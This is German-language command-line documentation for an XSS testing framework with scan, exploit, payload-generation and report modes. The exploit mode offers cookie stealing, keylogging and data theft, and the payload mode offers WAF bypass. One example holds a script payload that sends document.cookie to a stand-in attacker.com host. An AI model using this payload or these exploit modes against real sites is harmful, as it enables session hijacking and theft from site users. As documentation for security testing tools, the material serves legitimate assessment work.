# Befehlszeilenparameter

Das XSS Hunter Pro Framework bietet eine umfangreiche Kommandozeilenschnittstelle mit verschiedenen Modi und Optionen. Hier ist eine vollständige Dokumentation aller verfügbaren Befehlszeilenparameter.

## Allgemeine Parameter

Diese Parameter können in allen Modi verwendet werden:

| Parameter | Beschreibung | Standard |
|-----------|--------------|----------|
| `--config` | Pfad zur Konfigurationsdatei | `config.json` |
| `--debug` | Debug-Modus aktivieren | `false` |
| `--log-level` | Log-Level (DEBUG, INFO, WARNING, ERROR, CRITICAL) | `INFO` |
| `--log-file` | Pfad zur Log-Datei | `xsshunterpro.log` |
| `--output`, `-o` | Pfad zur Ausgabedatei | - |

## Scan-Modus

Der Scan-Modus wird verwendet, um Websites nach XSS-Schwachstellen zu scannen:

```bash
python main.py scan --url https://example.com --depth 3
```

### Parameter für den Scan-Modus

| Parameter | Beschreibung | Standard | Erforderlich |
|-----------|--------------|----------|--------------|
| `--url`, `-u` | Ziel-URL | - | Ja |
| `--depth`, `-d` | Scan-Tiefe | `3` | Nein |
| `--timeout`, `-t` | Timeout in Sekunden | `30` | Nein |
| `--user-agent` | User-Agent | - | Nein |
| `--cookies` | Cookies (Format: name1=value1;name2=value2) | - | Nein |
| `--headers` | HTTP-Header (Format: name1:value1;name2:value2) | - | Nein |
| `--proxy` | Proxy-URL | - | Nein |
| `--threads` | Anzahl der Threads | `10` | Nein |
| `--report` | Bericht erstellen | - | Nein |
| `--report-format` | Format des Berichts (html, json, markdown) | `html` | Nein |

## Exploit-Modus

Der Exploit-Modus wird verwendet, um bekannte XSS-Schwachstellen auszunutzen:

```bash
python main.py exploit --url https://example.com/search --param q --exploit-type data_theft
```

### Parameter für den Exploit-Modus

| Parameter | Beschreibung | Standard | Erforderlich |
|-----------|--------------|----------|--------------|
| `--url`, `-u` | Ziel-URL | - | Ja |
| `--param`, `-p` | Zu testender Parameter | - | Ja |
| `--exploit-type` | Typ des Exploits (data_theft, keylogger, dom_manipulation, cookie_stealing) | - | Ja |
| `--payload` | Benutzerdefinierter Payload | - | Nein |
| `--user-agent` | User-Agent | - | Nein |
| `--cookies` | Cookies (Format: name1=value1;name2=value2) | - | Nein |
| `--headers` | HTTP-Header (Format: name1:value1;name2:value2) | - | Nein |
| `--proxy` | Proxy-URL | - | Nein |
| `--timeout`, `-t` | Timeout in Sekunden | `30` | Nein |
| `--screenshot`, `-s` | Screenshot erstellen | `false` | Nein |
| `--start-callback` | Callback-Server starten | `false` | Nein |

## Payload-Modus

Der Payload-Modus wird verwendet, um optimierte XSS-Payloads zu generieren:

```bash
python main.py payload --payload-context javascript --use-ml
```

### Parameter für den Payload-Modus

| Parameter | Beschreibung | Standard | Erforderlich |
|-----------|--------------|----------|--------------|
| `--payload-context` | Kontext für die Payload-Generierung (html, javascript, attribute, url, css) | `html` | Nein |
| `--use-ml` | ML-basierte Payload-Optimierung verwenden | `false` | Nein |
| `--custom-template` | Benutzerdefinierte Payload-Vorlage | - | Nein |
| `--bypass-waf` | WAF-Bypass-Techniken verwenden | `false` | Nein |

## Report-Modus

Der Report-Modus wird verwendet, um Berichte aus gefundenen Schwachstellen zu erstellen:

```bash
python main.py report --report-file vulnerabilities.json --report-format html
```

### Parameter für den Report-Modus

| Parameter | Beschreibung | Standard | Erforderlich |
|-----------|--------------|----------|--------------|
| `--report-file` | Pfad zur Vulnerabilities-Datei | - | Ja |
| `--report-format` | Format des Berichts (html, json, markdown) | `html` | Nein |
| `--no-screenshots` | Keine Screenshots einbeziehen | `false` | Nein |
| `--no-payloads` | Keine Payloads einbeziehen | `false` | Nein |
| `--no-request-response` | Keine Request/Response-Daten einbeziehen | `false` | Nein |

## Beispiele

### Scan einer Website mit Authentifizierung

```bash
python main.py scan --url https://example.com --depth 3 --cookies "session=abc123" --user-agent "Mozilla/5.0" --report scan_report.html
```

### Exploitation einer Schwachstelle mit benutzerdefiniertem Payload

```bash
python main.py exploit --url https://example.com/search --param q --exploit-type data_theft --payload "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>" --screenshot
```

### Generierung von WAF-Bypass-Payloads

```bash
python main.py payload --payload-context javascript --use-ml --bypass-waf --output payloads.json
```

### Erstellung eines HTML-Berichts ohne Screenshots

```bash
python main.py report --report-file vulnerabilities.json --report-format html --no-screenshots --output final_report.html
```
